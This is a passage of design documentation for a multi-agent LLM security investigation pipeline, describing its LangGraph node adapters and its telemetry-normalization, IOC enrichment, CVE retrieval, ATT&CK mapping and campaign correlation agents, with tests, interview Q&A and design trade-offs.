- Handle state updates from agent outputs

**Why it exists:**
- LangGraph expects functions with specific signature (state -> partial state)
- Agents have different signatures (specific inputs -> specific outputs)
- Adapters allow agents to work with LangGraph without modification
- Separates agent logic from workflow orchestration

**Problem it solves:**
- Bridges agent interface to LangGraph interface
- Extracts relevant state fields for each agent
- Merges agent outputs back into state
- Keeps agents independent of LangGraph

**Internal Workflow:**
```
State → Extract Fields → Call Agent → Merge Output → Return Partial State
```

**Dependencies:**
- **Imports:** `agents.*`, `graph.state`
- **Imported by:** `graph.workflow`
- **Calls:** Agent.run() methods

**Functions:**

#### `collection_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "events" field
- **Purpose:** LangGraph node wrapper for CollectionAgent
- **Logic:**
  1. Extract raw_events from state
  2. Call CollectionAgent.run(raw_events)
  3. Return {"events": normalized_events}
- **Why:** Adapter pattern for LangGraph integration

#### `enrichment_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "iocs" field
- **Purpose:** LangGraph node wrapper for EnrichmentAgent
- **Logic:**
  1. Extract events from state
  2. Call EnrichmentAgent.run(events)
  3. Return {"iocs": enriched_iocs}
- **Why:** Adapter pattern for LangGraph integration

#### `vulnerability_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "vulnerabilities" field
- **Purpose:** LangGraph node wrapper for VulnerabilityAgent
- **Logic:**
  1. Extract events and iocs from state
  2. Call VulnerabilityAgent.run(events, iocs)
  3. Return {"vulnerabilities": cves}
- **Why:** Adapter pattern for LangGraph integration

#### `attack_mapping_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "techniques" field
- **Purpose:** LangGraph node wrapper for AttackMappingAgent
- **Logic:**
  1. Extract events from state
  2. Call AttackMappingAgent.run(events)
  3. Return {"techniques": mapped_techniques}
- **Why:** Adapter pattern for LangGraph integration

#### `correlation_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "campaign" field
- **Purpose:** LangGraph node wrapper for CorrelationAgent
- **Logic:**
  1. Extract events, iocs, techniques from state
  2. Call CorrelationAgent.run(events, iocs, techniques)
  3. Return {"campaign": correlated_campaign}
- **Why:** Adapter pattern for LangGraph integration

#### `prediction_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "prediction" field
- **Purpose:** LangGraph node wrapper for PredictionAgent
- **Logic:**
  1. Extract techniques and campaign from state
  2. Call PredictionAgent.run(techniques, campaign)
  3. Return {"prediction": threat_prediction}
- **Why:** Adapter pattern for LangGraph integration

#### `reporting_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "report" field
- **Purpose:** LangGraph node wrapper for ReportingAgent
- **Logic:**
  1. Pass entire state to ReportingAgent
  2. Call ReportingAgent.run(state)
  3. Return {"report": markdown_report}
- **Why:** Adapter pattern for LangGraph integration

#### `response_node(state: InvestigationState) -> Dict`
- **Input:** InvestigationState
- **Output:** Partial state update with "actions_taken" field
- **Purpose:** LangGraph node wrapper for ResponseAgent
- **Logic:**
  1. Extract campaign, techniques, iocs from state
  2. Call ResponseAgent.run(campaign, techniques, iocs)
  3. Return {"actions_taken": action_results}
- **Why:** Adapter pattern for LangGraph integration

**Testing:**

**Unit Tests:**
```python
def test_collection_node():
    state = new_investigation_state([{"event_id": "1"}])
    result = collection_node(state)
    assert "events" in result
    assert isinstance(result["events"], list)

def test_enrichment_node():
    state = new_investigation_state([])
    state["events"] = [{"process": "powershell.exe"}]
    result = enrichment_node(state)
    assert "iocs" in result
```

**Manual Tests:**
```python
from graph.nodes import collection_node, enrichment_node
from graph.state import new_investigation_state

state = new_investigation_state([{"test": "event"}])
result = collection_node(state)
print(f"Collection result: {len(result['events'])} events")
```

**Expected Outputs:**
- Each node returns partial state update
- State updates merge into full state

**Failure Cases:**
- Agent raises exception
- State missing required fields
- Agent returns invalid data

**Edge Cases:**
- Empty state fields
- Agent returns empty results
- Agent returns None

**Interview Questions:**

**Q: Why have separate node functions instead of calling agents directly?**
**A:** LangGraph requires specific function signatures (state -> partial state). Agents have different signatures (specific inputs). Node functions adapt between these interfaces. This keeps agents independent of LangGraph, making them testable and reusable.

**Q: Why not make agents implement a common interface?**
**A:** Agents have different input requirements. CollectionAgent needs raw_events, CorrelationAgent needs events/iocs/techniques. A common interface would force all agents to accept full state, which is inefficient and unclear. Node functions provide the right inputs to each agent.

**Q: What happens if a node function fails?**
**A:** The exception propagates to the workflow, which fails the entire investigation. An improvement would be to add try-catch in node functions to capture errors in the state's errors field and allow the workflow to continue.

**Design Decisions:**

**Chosen Solution:** Thin adapter functions
**Alternatives:**
- Agent base class with to_node() method
- Decorator pattern
- Direct agent integration (modify agents)
- Dynamic node generation

**Advantages:**
- Simple and explicit
- No agent modification needed
- Easy to understand
- Easy to test
- Clear separation of concerns

**Disadvantages:**
- Boilerplate code
- Manual state field extraction
- No error handling in nodes
- No logging in nodes

**Weak Points:**
- No error handling in node functions
- No logging of node execution
- No performance monitoring
- Manual field extraction (error-prone)
- No validation of agent outputs

**Improvements:**
- Add try-catch for error handling
- Add logging for node entry/exit
- Add performance timing
- Use a decorator to reduce boilerplate
- Add validation of agent outputs
- Add node-level metrics

---

## AI Agents

### agents/collection_agent.py

**Purpose:**
- Normalize raw security telemetry into consistent event schema
- Handle multiple telemetry sources (Sysmon, Suricata, Zeek, Wazuh)
- Batch events to manage LLM context limits
- Assign unique IDs to events

**Why it exists:**
- Raw telemetry from different sources has different schemas
- Downstream agents need consistent event structure
- LLM context limits require batching
- Event IDs enable traceability and correlation

**Problem it solves:**
- Standardizes heterogeneous telemetry
- Enables cross-source analysis
- Manages LLM token limits
- Provides event identity for correlation

**Internal Workflow:**
```
Raw Events → Batch (20 events) → LLM Normalization → Parse Response → Assign UUIDs → Return Normalized Events
```

**Dependencies:**
- **Imports:** `uuid`, `typing`, `llm.groq_client`, `llm.prompts`, `llm.output_parsers`
- **Imported by:** `graph.nodes`
- **Calls:** `invoke_llm()`, `extract_json()`

**Classes:**

#### `CollectionAgent`
- **Purpose:** Normalize raw telemetry events
- **Logic:** Batches events, uses LLM to normalize, parses response, adds UUIDs

**Methods:**

#### `run(self, events: List[Dict]) -> List[Dict]`
- **Input:** List of raw event dictionaries
- **Output:** List of normalized event dictionaries
- **Purpose:** Normalize events to standard schema
- **Logic:**
  1. Log incoming event count
  2. Return empty list if no events
  3. Batch events (20 per batch)
  4. For each batch:
     - Construct prompt with batch events
     - Call LLM with COLLECTION_SYSTEM_PROMPT
     - Parse JSON response
     - Add UUID event_id to each event
  5. Combine all batch results
  6. Return normalized events
- **Why:** Batching manages LLM context limits
- **Batch Size:** 20 events (configurable)
- **LLM Prompt:** COLLECTION_SYSTEM_PROMPT
- **Fallback:** If parsing fails, returns empty list for that batch

**Example:**
```python
agent = CollectionAgent()
raw_events = [
    {"source": "sysmon", "process": "powershell.exe"},
    {"source": "suricata", "alert": "malware"}
]
normalized = agent.run(raw_events)
# Returns:
[
    {"event_id": "uuid-1", "timestamp": "...", "process": "powershell.exe", ...},
    {"event_id": "uuid-2", "timestamp": "...", "alert": "malware", ...}
]
```

**Testing:**

**Unit Tests:**
```python
def test_collection_agent_empty():
    agent = CollectionAgent()
    result = agent.run([])
    assert result == []

def test_collection_agent_batching():
    agent = CollectionAgent()
    events = [{"test": str(i)} for i in range(50)]
    result = agent.run(events)
    assert len(result) == 50
    assert all("event_id" in e for e in result)

def test_collection_agent_uuid():
    agent = CollectionAgent()
    result = agent.run([{"test": "event"}])
    assert "event_id" in result[0]
    assert uuid.UUID(result[0]["event_id"])  # Valid UUID
```

**Manual Tests:**
```python
from agents.collection_agent import CollectionAgent

agent = CollectionAgent()
events = [{"source": "sysmon", "process": "powershell.exe"}]
normalized = agent.run(events)
print(f"Normalized {len(normalized)} events")
print(f"Sample: {normalized[0]}")
```

**Expected Outputs:**
- Normalized events with consistent schema
- UUID event_id for each event
- Standardized field names

**Failure Cases:**
- LLM API failure
- JSON parsing failure
- Invalid input events
- Rate limiting

**Edge Cases:**
- Very large event arrays (many batches)
- Events with missing fields
- Malformed events
- LLM returns invalid JSON

**Interview Questions:**

**Q: Why batch events instead of sending all at once?**
**A:** LLM context limits. Sending 1000 events would exceed token limits. Batching allows processing arbitrary event volumes within limits. Batch size of 20 is a balance between efficiency and context limits.

**Q: Why use LLM for normalization instead of rule-based parsing?**
**A:** Flexibility. Rule-based parsers require manual rules for each telemetry source. LLM can handle new sources and formats without code changes. It's more maintainable and adaptable.

**Q: What happens if one batch fails?**
**A:** Currently, that batch returns empty events, but other batches continue. An improvement would be to retry failed batches or use a fallback rule-based parser for reliability.

**Design Decisions:**

**Chosen Solution:** LLM-based normalization with batching
**Alternatives:**
- Rule-based parsers: Faster, more predictable
- Hybrid: Rules for common sources, LLM for unknown
- Schema-on-read: Normalize during query time
- Pre-normalized telemetry: Require upstream normalization

**Advantages:**
- Handles any telemetry format
- No manual parser maintenance
- Adapts to new sources automatically
- Consistent output schema

**Disadvantages:**
- Slower than rule-based
- LLM API costs
- Less predictable output
- Dependent on LLM availability

**Weak Points:**
- No retry logic for failed batches
- No fallback to rule-based parsing
- Batch size is hardcoded
- No validation of normalized output
- No handling of partial batch failures

**Improvements:**
- Add retry logic with exponential backoff
- Implement fallback rule-based parsers
- Make batch size configurable
- Add output schema validation
- Add caching for common event patterns
- Add parallel batch processing

---

### agents/enrichment_agent.py

**Purpose:**
- Extract indicators of compromise (IOCs) from events
- Enrich IOCs with threat intelligence context
- Score IOCs for maliciousness
- Provide confidence scores and justifications

**Why it exists:**
- Raw events contain IOCs but no context
- Security analysts need IOC scoring to prioritize
- Automated response needs confidence scores
- Threat intelligence adds context to IOCs

**Problem it solves:**
- Identifies malicious indicators in events
- Provides actionable IOC intelligence
- Enables automated response based on IOC severity
- Reduces manual IOC analysis time

**Internal Workflow:**
```
Events → Extract IOCs (regex) → LLM Enrichment → Parse Response → Return Enriched IOCs
```

**Dependencies:**
- **Imports:** `typing`, `llm.groq_client`, `llm.prompts`, `llm.output_parsers`, `intelligence.ioc_extractor`
- **Imported by:** `graph.nodes`
- **Calls:** `extract_iocs()`, `invoke_llm()`, `extract_json()`

**Classes:**

#### `EnrichmentAgent`
- **Purpose:** Extract and enrich IOCs from events
- **Logic:** Extracts IOCs with regex, enriches with LLM, parses response

**Methods:**

#### `run(self, events: List[Dict]) -> List[Dict]`
- **Input:** List of normalized event dictionaries
- **Output:** List of enriched IOC dictionaries
- **Purpose:** Extract and enrich IOCs
- **Logic:**
  1. Log incoming event count
  2. Return empty list if no events
  3. Extract IOCs using regex patterns (via ioc_extractor)
  4. Return empty list if no IOCs
  5. Construct prompt with extracted IOCs
  6. Call LLM with ENRICHMENT_SYSTEM_PROMPT
  7. Parse JSON response
  8. If parsing fails, return unenriched IOCs
  9. Return enriched IOCs
- **Why:** Combines regex extraction with LLM enrichment
- **IOC Types:** IPs, hashes (MD5/SHA1/SHA256), URLs, domains
- **LLM Prompt:** ENRICHMENT_SYSTEM_PROMPT
- **Fallback:** Return unenriched IOCs if LLM fails

**Example:**
```python
agent = EnrichmentAgent()
events = [{"src_ip": "185.220.101.45", "hash": "abc123..."}]
enriched = agent.run(events)
# Returns:
[
    {
        "value": "185.220.101.45",
        "ioc_type": "ip",
        "verdict": "malicious",
        "confidence": 0.95,
        "justification": "Known Tor exit node"
    },
    {
        "value": "abc123...",
        "ioc_type": "hash",
        "verdict": "suspicious",
        "confidence": 0.80,
        "justification": "Seen in malware samples"
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_enrichment_agent_empty():
    agent = EnrichmentAgent()
    result = agent.run([])
    assert result == []

def test_enrichment_agent_extraction():
    agent = EnrichmentAgent()
    events = [{"src_ip": "192.168.1.1", "dest_ip": "8.8.8.8"}]
    result = agent.run(events)
    assert len(result) >= 1
    assert all("ioc_type" in ioc for ioc in result)

def test_enrichment_agent_scoring():
    agent = EnrichmentAgent()
    events = [{"src_ip": "185.220.101.45"}]  # Known malicious IP
    result = agent.run(events)
    assert all("verdict" in ioc for ioc in result)
    assert all("confidence" in ioc for ioc in result)
```

**Manual Tests:**
```python
from agents.enrichment_agent import EnrichmentAgent

agent = EnrichmentAgent()
events = [{"src_ip": "185.220.101.45", "process": "powershell.exe"}]
enriched = agent.run(events)
print(f"Extracted {len(enriched)} IOCs")
for ioc in enriched:
    print(f"{ioc['ioc_type']}: {ioc['value']} - {ioc['verdict']}")
```

**Expected Outputs:**
- Enriched IOCs with verdict, confidence, justification
- IOC type classification
- Source event references

**Failure Cases:**
- IOC extraction fails
- LLM API failure
- JSON parsing failure
- Rate limiting

**Edge Cases:**
- Events with no IOCs
- IOCs with ambiguous context
- LLM returns incomplete data
- Large number of IOCs

**Interview Questions:**

**Q: Why use regex for IOC extraction instead of LLM?**
**A:** Performance and reliability. Regex is fast, deterministic, and doesn't consume API quota. LLM is used for enrichment (context and scoring) where its intelligence is valuable. This hybrid approach balances speed and intelligence.

**Q: What happens if the LLM enrichment fails?**
**A:** The agent returns unenriched IOCs (just the extracted values and types). This ensures the investigation continues even if enrichment fails, though with reduced intelligence. An improvement would be to cache enrichment results for common IOCs.

**Q: Why include source_event_id in IOCs?**
**A:** Traceability. Analysts need to know which event generated which IOC. This enables drilling down from IOC to original event for investigation.

**Design Decisions:**

**Chosen Solution:** Regex extraction + LLM enrichment
**Alternatives:**
- Pure LLM extraction and enrichment: Slower, more expensive
- Pure rule-based enrichment: Faster, less intelligent
- Threat intelligence API lookup: More accurate, external dependency
- Hybrid with caching: Best of both worlds

**Advantages:**
- Fast regex extraction
- Intelligent LLM enrichment
- No external threat intel dependency
- Flexible verdict assignment

**Disadvantages:**
- LLM API costs
- Dependent on LLM knowledge
- No real-time threat intel
- May miss new threats

**Weak Points:**
- No caching of enrichment results
- No fallback to threat intel APIs
- IOC extraction patterns are hardcoded
- No IOC deduplication across events
- No IOC reputation scoring

**Improvements:**
- Add caching for common IOCs
- Add fallback to VirusTotal/AlienVault APIs
- Make IOC patterns configurable
- Add IOC deduplication
- Add IOC reputation scoring
- Add IOC temporal analysis (first seen, last seen)

---

### agents/vulnerability_agent.py

**Purpose:**
- Identify relevant CVEs from security events
- Extract software context from events and IOCs
- Retrieve CVEs using RAG (Retrieval-Augmented Generation)
- Analyze and filter CVEs with LLM

**Why it exists:**
- Security events may involve vulnerable software
- CVE intelligence helps prioritize remediation
- RAG enables semantic CVE matching
- LLM provides relevance filtering

**Problem it solves:**
- Identifies software vulnerabilities in events
- Provides CVE context for incidents
- Enables vulnerability-based response prioritization
- Reduces manual CVE lookup time

**Internal Workflow:**
```
Events + IOCs → Extract Software Context → RAG CVE Retrieval → LLM Analysis → Filter Relevant CVEs → Return
```

**Dependencies:**
- **Imports:** `logging`, `typing`, `llm.groq_client`, `llm.prompts`, `llm.output_parsers`, `rag.cve_retriever`
- **Imported by:** `graph.nodes`
- **Calls:** `invoke_llm()`, `extract_json()`, `retrieve_cves()`

**Classes:**

#### `VulnerabilityAgent`
- **Purpose:** Identify relevant CVEs from events
- **Logic:** Extracts software context, retrieves CVEs via RAG, filters with LLM

**Methods:**

#### `run(self, events: List[Dict], iocs: List[Dict]) -> List[Dict]`
- **Input:** Events and IOCs
- **Output:** List of relevant CVEs
- **Purpose:** Identify CVEs relevant to the investigation
- **Logic:**
  1. Log incoming events and IOCs
  2. Return empty if no events or IOCs
  3. Extract software context from events/IOCs
  4. Return empty if no software context
  5. Retrieve CVEs via RAG based on software context
  6. Return empty if no CVEs retrieved
  7. Build prompt with events, IOCs, retrieved CVEs
  8. Call LLM with VULNERABILITY_SYSTEM_PROMPT
  9. Parse JSON response
  10. If parsing fails, use fallback analysis
  11. Return relevant CVEs
- **Why:** Combines software extraction, RAG, and LLM analysis
- **Software Fields:** process_name, service_name, software, application, product, process, image, command_line
- **LLM Prompt:** VULNERABILITY_SYSTEM_PROMPT
- **Fallback:** Returns top CVEs with lower confidence

#### `_extract_software_context(self, events: List[Dict], iocs: List[Dict]) -> List[str]`
- **Input:** Events and IOCs
- **Output:** List of software terms
- **Purpose:** Extract software names and versions
- **Logic:**
  1. Extract from common event fields (process_name, service_name, etc.)
  2. Extract from command_line (software patterns, JAR files)
  3. Extract known software (Log4j, Spring, Java) from command_line
  4. Extract from IOCs (file paths, process names)
  5. Extract known software from IOC values
  6. Deduplicate and return
- **Why:** Multiple extraction strategies for comprehensive coverage

#### `_build_prompt(self, events, iocs, retrieved_cves) -> str`
- **Input:** Events, IOCs, retrieved CVEs
- **Output:** Formatted prompt string
- **Purpose:** Build LLM prompt for vulnerability analysis
- **Logic:**
  1. Add software context from events (limited to 5)
  2. Add IOC context (limited to 10)
  3. Add retrieved CVEs with metadata
  4. Return formatted prompt
- **Why:** Structures data for LLM consumption

#### `_fallback_analysis(self, retrieved_cves, software_context) -> List[Dict]`
- **Input:** Retrieved CVEs, software context
- **Output:** List of CVEs with lower confidence
- **Purpose:** Fallback when LLM fails
- **Logic:**
  1. Match software terms to CVE affected_software
  2. Assign confidence based on match quality
  3. Return top 5 CVEs with 0.5-0.7 confidence
- **Why:** Ensures some CVE results even if LLM fails

**Example:**
```python
agent = VulnerabilityAgent()
events = [{"process_name": "java", "command_line": "log4j"}]
iocs = [{"value": "log4j-core.jar", "ioc_type": "file_path"}]
cves = agent.run(events, iocs)
# Returns:
[
    {
        "cve_id": "CVE-2021-44228",
        "cvss_score": 10.0,
        "severity": "CRITICAL",
        "confidence": 0.95,
        "justification": "Log4j vulnerability matches command_line",
        "affected_software": "Apache Log4j"
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_vulnerability_agent_empty():
    agent = VulnerabilityAgent()
    result = agent.run([], [])
    assert result == []

def test_vulnerability_agent_software_extraction():
    agent = VulnerabilityAgent()
    events = [{"process_name": "java", "command_line": "log4j"}]
    context = agent._extract_software_context(events, [])
    assert "java" in context
    assert "log4j" in context.lower()

def test_vulnerability_agent_fallback():
    agent = VulnerabilityAgent()
    cves = [{"cve_id": "CVE-2021-44228", "affected_software": "Log4j"}]
    result = agent._fallback_analysis(cves, ["Log4j"])
    assert len(result) > 0
    assert result[0]["cve_id"] == "CVE-2021-44228"
```

**Manual Tests:**
```python
from agents.vulnerability_agent import VulnerabilityAgent

agent = VulnerabilityAgent()
events = [{"process_name": "java", "command_line": "log4j"}]
iocs = [{"value": "log4j-core.jar", "ioc_type": "file_path"}]
cves = agent.run(events, iocs)
print(f"Found {len(cves)} CVEs")
for cve in cves:
    print(f"{cve['cve_id']}: {cve['severity']} (CVSS: {cve['cvss_score']})")
```

**Expected Outputs:**
- Relevant CVEs with CVSS scores
- Severity classification
- Confidence scores
- Justification for relevance

**Failure Cases:**
- No software context found
- CVE retrieval fails
- LLM API failure
- JSON parsing failure

**Edge Cases:**
- Ambiguous software names
- CVE database empty
- LLM returns no CVEs
- Software context too generic

**Interview Questions:**

**Q: Why extract software context instead of using the entire event?**
**A:** Precision. Sending entire events to RAG would retrieve irrelevant CVEs. Extracting specific software terms improves retrieval accuracy and reduces false positives.

**Q: Why use RAG for CVE retrieval instead of direct database query?**
**A:** Semantic matching. RAG finds CVEs based on software context similarity, not exact matches. This handles variations in software naming and descriptions.

**Q: What's the purpose of the fallback analysis?**
**A:** Reliability. If the LLM fails (rate limit, parsing error), the agent still returns some CVEs using simple string matching. This ensures the vulnerability analysis always produces results.

**Design Decisions:**

**Chosen Solution:** Software extraction + RAG + LLM filtering
**Alternatives:**
- Direct CVE database query: Exact matches only
- Pure LLM CVE identification: No database, hallucination risk
- Rule-based CVE mapping: Manual maintenance
- Hybrid with CVE API lookup: Real-time data

**Advantages:**
- Semantic matching via RAG
- LLM intelligence for relevance
- Fallback for reliability
- Handles software name variations

**Disadvantages:**
- Requires CVE database ingestion
- LLM API costs
- Dependent on CVE data quality
- May miss CVEs not in database

**Weak Points:**
- Software extraction is heuristic
- CVE database may be outdated
- No real-time CVE data
- Fallback analysis is simplistic
- No CVE exploitability assessment

**Improvements:**
- Add machine learning for software extraction
- Add real-time CVE API integration (NVD)
- Add CVE exploitability (EPSS) scores
- Add CVE patch availability
- Add CVE temporal analysis
- Improve fallback with better matching

---

### agents/attack_mapping_agent.py

**Purpose:**
- Map security events to MITRE ATT&CK technique IDs
- Use RAG (Retrieval-Augmented Generation) for semantic matching
- Provide confidence scores for technique mappings
- Link events to specific ATT&CK techniques

**Why it exists:**
- ATT&CK provides standardized threat behavior classification
- Semantic matching handles diverse event descriptions
- Enables campaign correlation based on techniques
- Provides threat intelligence context

**Problem it solves:**
- Standardizes threat behavior classification
- Enables cross-incident technique comparison
- Provides MITRE ATT&CK context for events
- Supports threat hunting and detection engineering

**Internal Workflow:**
```
Events → Convert to Text → RAG Retrieval → LLM Analysis → Parse Response → Return Mapped Techniques
```

**Dependencies:**
- **Imports:** `typing`, `llm.groq_client`, `llm.prompts`, `llm.output_parsers`, `rag.retriever`
- **Imported by:** `graph.nodes`
- **Calls:** `retrieve_attack_context()`, `invoke_llm()`, `extract_json()`

**Classes:**

#### `AttackMappingAgent`
- **Purpose:** Map events to MITRE ATT&CK techniques
- **Logic:** Retrieves ATT&CK context via RAG, uses LLM to map events to techniques

**Methods:**

#### `run(self, events: List[Dict]) -> List[Dict]`
- **Input:** List of normalized event dictionaries
- **Output:** List of mapped technique dictionaries
- **Purpose:** Map events to MITRE ATT&CK techniques
- **Logic:**
  1. Log incoming event count
  2. Return empty list if no events
  3. For each event:
     - Convert event to text description
     - Retrieve ATT&CK context via RAG
     - Build prompt with event and ATT&CK context
     - Call LLM with MAPPING_SYSTEM_PROMPT
     - Parse JSON response
     - If parsing fails, return empty list for this event
  4. Combine all technique mappings
  5. Return mapped techniques
- **Why:** RAG provides relevant ATT&CK context, LLM performs mapping
- **LLM Prompt:** MAPPING_SYSTEM_PROMPT
- **Fallback:** Return empty list if parsing fails

**Example:**
```python
agent = AttackMappingAgent()
events = [{"process": "powershell.exe", "command_line": "Invoke-WebRequest"}]
techniques = agent.run(events)
# Returns:
[
    {
        "technique_id": "T1059.001",
        "name": "PowerShell",
        "confidence": 0.92,
        "evidence_event_id": "uuid-1",
        "justification": "PowerShell execution matches T1059.001"
    }
]
```

**Testing:**

**Unit Tests:**
```python
def test_attack_mapping_agent_empty():
    agent = AttackMappingAgent()
    result = agent.run([])
    assert result == []

def test_attack_mapping_agent_mapping():
    agent = AttackMappingAgent()
    events = [{"process": "powershell.exe"}]
    result = agent.run(events)
    assert len(result) > 0
    assert all("technique_id" in t for t in result)

def test_attack_mapping_agent_confidence():
    agent = AttackMappingAgent()
    events = [{"process": "powershell.exe"}]
    result = agent.run(events)
    assert all("confidence" in t for t in result)
    assert all(0 <= t["confidence"] <= 1 for t in result)
```

**Manual Tests:**
```python
from agents.attack_mapping_agent import AttackMappingAgent

agent = AttackMappingAgent()
events = [{"process": "powershell.exe", "command_line": "Invoke-WebRequest"}]
techniques = agent.run(events)
print(f"Mapped {len(techniques)} techniques")
for tech in techniques:
    print(f"{tech['technique_id']}: {tech['name']} (confidence: {tech['confidence']})")
```

**Expected Outputs:**
- Mapped techniques with ATT&CK IDs
- Technique names and confidence scores
- Evidence event references
- Justifications for mappings

**Failure Cases:**
- RAG retrieval fails
- LLM API failure
- JSON parsing failure
- ChromaDB connection failure

**Edge Cases:**
- Events with no clear technique match
- Events matching multiple techniques
- LLM returns invalid technique IDs
- Empty ATT&CK context

**Interview Questions:**

**Q: Why use RAG instead of direct ATT&CK technique lookup?**
**A:** Semantic matching. Direct lookup requires exact keyword matches. RAG finds techniques based on semantic similarity, handling diverse event descriptions and terminology variations.

**Q: What happens if an event doesn't match any ATT&CK technique?**
**A:** The agent returns an empty list for that event. The investigation continues, but that event won't contribute to technique-based analysis. An improvement would be to assign a "unknown" technique for traceability.

**Q: Why include evidence_event_id in technique mappings?**
**A:** Traceability. Analysts need to know which event evidence supports each technique mapping. This enables drilling down from technique to original event.

**Design Decisions:**

**Chosen Solution:** RAG + LLM mapping
**Alternatives:**
- Rule-based keyword matching: Faster, less accurate
- Pure LLM technique identification: No database, hallucination risk
- ATT&CK technique API lookup: Real-time data, external dependency
- Hybrid with technique taxonomy: More structured

**Advantages:**
- Semantic matching via RAG
- LLM intelligence for mapping
- Handles diverse event descriptions
- Standardized ATT&CK output

**Disadvantages:**
- Requires ATT&CK database ingestion
- LLM API costs
- Dependent on ATT&CK data quality
- May miss techniques not in database

**Weak Points:**
- No technique confidence calibration
- No handling of technique sub-techniques
- No technique tactic/tier classification
- No technique detection difficulty
- No technique mitigation information

**Improvements:**
- Add technique confidence calibration
- Include tactic and tier information
- Add technique detection difficulty
- Add technique mitigation guidance
- Add technique prevalence data
- Implement technique hierarchy mapping

---

### agents/correlation_agent.py

**Purpose:**
- Correlate isolated security events into attack campaigns
- Identify relationships between events, IOCs, and techniques
- Build coherent attack narratives
- Persist campaigns to knowledge graph

**Why it exists:**
- Isolated events lack context
- Campaign correlation reveals attack scope
- Knowledge graph enables relationship queries
- Supports threat hunting and incident response

**Problem it solves:**
- Groups related events into campaigns
- Identifies attack patterns and sequences
- Provides campaign-level intelligence
- Enables knowledge graph analysis

**Internal Workflow:**
```
Events + IOCs + Techniques → LLM Correlation → Parse Response → Persist to Neo4j → Return Campaign
```

**Dependencies:**
- **Imports:** `uuid`, `typing`, `llm.groq_client`, `llm.prompts`, `llm.output_parsers`, `knowledge_graph.graph_builder`
- **Imported by:** `graph.nodes`
- **Calls:** `invoke_llm()`, `extract_json()`, `persist_campaign()`

**Classes:**

#### `CorrelationAgent`
- **Purpose:** Correlate events into campaigns
- **Logic:** Uses LLM to identify patterns, persists to Neo4j

**Methods:**

#### `run(self, events: List[Dict], iocs: List[Dict], techniques: List[Dict]) -> Dict`
- **Input:** Events, IOCs, techniques
- **Output:** Campaign dictionary
- **Purpose:** Correlate events into a campaign
- **Logic:**
  1. Log incoming counts
  2. Return empty dict if no events
  3. Construct prompt with events, IOCs, techniques
  4. Call LLM with CORRELATION_SYSTEM_PROMPT
  5. Parse JSON response
  6. If parsing fails, create fallback campaign
  7. Ensure campaign_id exists (generate UUID if missing)
  8. Persist campaign to Neo4j (best-effort, don't fail on errors)
  9. Return campaign
- **Why:** LLM identifies patterns, Neo4j persists relationships
- **LLM Prompt:** CORRELATION_SYSTEM_PROMPT
- **Fallback:** Creates "Unclassified Activity" campaign with UUID

**Example:**
```python
agent = CorrelationAgent()
events = [{"event_id": "1", "process": "powershell.exe"}]
iocs = [{"value": "185.220.101.45", "ioc_type": "ip"}]
techniques = [{"technique_id": "T1059.001"}]
campaign = agent.run(events, iocs, techniques)
# Returns:
{
    "campaign_id": "uuid-here",
    "name": "PowerShell C2 Activity",
    "timeline": [...],
    "related_techniques": ["T1059.001"]
}
```

**Testing:**

**Unit Tests:**
```python
def test_correlation_agent_empty():
    agent = CorrelationAgent()
    result = agent.run([], [], [])
    assert result == {}

def test_correlation_agent_campaign_id():
    agent = CorrelationAgent()
    result = agent.run([{"event_id": "1"}], [], [])
    assert "campaign_id" in result
    assert uuid.UUID(result["campaign_id"])  # Valid UUID

def test_correlation_agent_fallback():
    agent = CorrelationAgent()
    # Mock LLM to fail parsing
    result = agent.run([{"event_id": "1"}], [], [])
    assert result["name"] == "Unclassified Activity"
```

**Manual Tests:**
```python
from agents.correlation_agent import CorrelationAgent

agent = CorrelationAgent()
events = [{"event_id": "1", "process": "powershell.exe"}]
iocs = [{"value": "185.220.101.45", "ioc_type": "ip"}]
techniques = [{"technique_id": "T1059.001"}]
campaign = agent.run(events, iocs, techniques)
print(f"Campaign: {campaign['name']}")
print(f"ID: {campaign['campaign_id']}")
```

**Expected Outputs:**
- Campaign with unique ID
- Campaign name describing the activity
- Timeline of events
- Related techniques

**Failure Cases:**
- LLM API failure
- JSON parsing failure
- Neo4j persistence failure (non-fatal)
- Invalid input data

**Edge Cases:**
- Events with no clear correlation
- Single event (no correlation possible)
- Neo4j connection failure
- LLM returns invalid campaign structure

**Interview Questions:**

**Q: Why persist campaigns to Neo4j instead of just returning them?**
**A:** Knowledge graph enables relationship queries across campaigns. Analysts can query "all campaigns involving this IP" or "campaigns using this technique." Neo4j provides graph traversal capabilities that JSON doesn't.

**Q: What happens if Neo4j persistence fails?**
**A:** The agent catches the exception and continues. Campaign persistence is best-effort. The investigation returns the campaign even if Neo4j fails. This prevents Neo4j issues from blocking investigations.

**Q: Why generate a fallback campaign on parsing failure?**
**A:** Ensures investigation continues. Even if LLM correlation fails, a fallback campaign with a UUID ensures downstream agents (prediction, reporting) have campaign data to work with.

**Design Decisions:**

**Chosen Solution:** LLM correlation + Neo4j persistence
**Alternatives:**
- Rule-based correlation: Faster, less intelligent
- Graph-based correlation only: No LLM intelligence
- Pure LLM correlation: No persistence
- Hybrid with temporal analysis: More sophisticated

**Advantages:**
- LLM identifies complex patterns
- Neo4j enables relationship queries
- Fallback ensures continuity
- Best-effort persistence

**Disadvantages:**
- LLM API costs
- Neo4j dependency
- Fallback is simplistic
- No temporal correlation logic

**Weak Points:**
- No temporal analysis
- No spatial correlation
- No user behavior correlation
- No campaign similarity detection
- No campaign merging logic

**Improvements:**
- Add temporal correlation (time windows)
- Add spatial correlation (network topology)
- Add user behavior correlation
- Implement campaign similarity detection
- Add campaign merging for related activities
- Add campaign lifecycle tracking

---

### agents/prediction_agent.py

**Purpose:**
- Predict attacker's likely next steps
- Based on current techniques and MITRE ATT&CK attack chains
- Provide confidence scores for predictions
- Support proactive defense

**Why it exists:**
- Threat prediction enables proactive defense
- ATT&CK attack chains provide predictive patterns
- Helps analysts anticipate attacker moves
- Supports threat hunting and detection engineering

**Problem it solves:**
- Forecasts attacker behavior
